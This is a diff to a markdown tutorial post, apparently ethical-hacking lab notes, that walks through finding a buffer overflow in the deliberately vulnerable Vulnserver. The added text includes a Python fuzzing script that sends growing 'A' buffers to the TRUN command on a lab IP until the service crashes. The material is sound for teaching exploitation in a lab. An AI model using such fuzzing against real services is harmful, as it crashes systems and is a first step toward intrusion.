@@ -49,6 +49,7 @@ To setup the environment, two hosts are required: a Kali Linux host and a Window
 
 1. Explore
    - **Identify target application:** Vulnserver is being used for this example.
+
 2. Experiment
    - **Find injection vector:** Kali Linux has a built-in tool called `generic_send_tcp` that is used to generate TCP connections with the Vulnserver application and send data to the various inputs. The following is a sample of some of the inputs that are present on the Vulnserver application. This method of finding the injection vector is also referred to as spiking.
 
@@ -72,4 +73,39 @@ To setup the environment, two hosts are required: a Kali Linux host and a Window
       - Running the test on `TRUN` identified a buffer overflow vulnerability. The below screenshot shows the evidence via immunity debugger. Note that the value `A` is repeated in register `EAX` and has overflowed into additional registers `ESP`, `EBP`, and `EIP`. The values of `EBP` and `EIP` are expressed in Hex equivalent (A = 41).
 
         ![Immunity Debugger - Buffer Overflow Example](/assets/img/posts/ETH/CAPEC/100_Experiment_ImmunityDBG.png "Immunity Debugger - Buffer Overflow Example")
+
     - **Craft overflow content:**
+      - Having identified that `TRUN` is vulnerable, the next step is to identify the exact byte count at which the the application crash occurs. A fuzzing script can be written and used against `TRUN` to step the fuzzing process, the below python script can be used to achieve this.
+
+        ```python
+        #!/usr/bin/python
+        import sys, socket
+        from time import sleep
+
+        ############### fuzzing script ##################
+
+        buffer = "A" * 100
+
+        while True:
+            try:
+
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect(('172.16.70.134',9999))
+
+                s.send(('TRUN /.:/' + buffer))
+                s.close
+                sleep(1)
+                buffer = buffer + "A"*100
+
+            except:
+                print "Fuzzing crashed at %s bytes" % str(len(buffer))
+                sys.exit()
+        ```
+        
+        Once the script has completed, the byte count will be printed to the terminal.
+
+# Sources
+- [TCM Academy - Practical Ethical Hacking](https://academy.tcm-sec.com/)
+- [Hacking - The Art of Exploitation 2nd Edition](https://www.amazon.com.au/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441)
+- [OWASP - Buffer Overflow Attack](https://owasp.org/www-community/attacks/Buffer_overflow_attack)
+- [Catharsis - Basic Buffer Overflow Guide](https://catharsis.net.au/blog/basic-buffer-overflow-guide/)
